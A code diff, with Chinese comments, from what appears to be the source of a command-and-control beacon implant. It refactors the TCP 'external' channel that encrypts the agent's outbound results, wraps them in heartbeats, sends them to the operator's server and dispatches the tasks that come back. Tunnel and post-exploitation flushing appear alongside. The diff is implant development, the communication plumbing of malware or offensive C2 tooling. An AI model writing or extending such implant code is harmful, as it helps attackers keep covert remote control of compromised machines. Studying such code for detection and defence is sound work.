@@ -40,46 +40,25 @@ static INT BuildTcpExternalEncryptedHeartbeat(BeaconContext* ctx, const ByteBuf*
     return ok;
 }
 
-/* 加密并通过 TCP external 长连接发送所有出站数据包 */
-static INT FlushOutboxTcpExternal(BeaconContext* ctx, TcpExternalSession* session)
+/* TCP-external 发送回调：把 encrypted result 拼入心跳明文后整体加密发送，收回任务。 */
+static INT TcpExternalSendEncrypted(BeaconContext* ctx, VOID* ctx_sender,
+                                    const ByteBuf* encrypted, ByteBuf* response)
 {
-    OutboxNode* list = OutboxDrain(&ctx->outbox);
-    OutboxNode* cur = list;
+    TcpExternalSession* session = (TcpExternalSession*)ctx_sender;
+    ByteBuf heartbeat;
+    INT ok;
 
-    while (cur) {
-        ByteBuf encrypted_result;
-        ByteBuf heartbeat;
-        ByteBuf response;
-
-        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted_result)) {
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return 0;
-        }
-
-        if (!BuildTcpExternalEncryptedHeartbeat(ctx, &encrypted_result, &heartbeat)) {
-            BbFree(&encrypted_result);
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return 0;
-        }
-        BbFree(&encrypted_result);
-
-        if (!TransportTcpExternalExchange(session, &heartbeat, &response)) {
-            BbFree(&heartbeat);
-            OutboxPushFrontList(&ctx->outbox, cur);
-            return 0;
-        }
-        BbFree(&heartbeat);
-
-        AgentDispatchTasks(ctx, &response);
-        BbFree(&response);
-
-        {
-            OutboxNode* done = cur;
-            cur = cur->next;
-            OutboxFreeNode(done);
-        }
+    BbInit(response);
+    if (!BuildTcpExternalEncryptedHeartbeat(ctx, encrypted, &heartbeat)) {
+        return 0;
     }
 
+    ok = TransportTcpExternalExchange(session, &heartbeat, response);
+    BbFree(&heartbeat);
+    if (!ok) {
+        BbFree(response);
+        return 0;
+    }
     return 1;
 }
 
@@ -156,7 +135,7 @@ INT AgentRunExternalTcp(Agent* agent)
         AgentFlushTunnels(ctx);
         AgentFlushCascade(ctx);
         AgentFlushPostEx(ctx);
-        if (!FlushOutboxTcpExternal(ctx, &session)) {
+        if (!AgentFlushOutbox(ctx, TcpExternalSendEncrypted, &session)) {
             TransportTcpExternalClose(&session);
             if (failures++ >= max_failures) {
                 break;
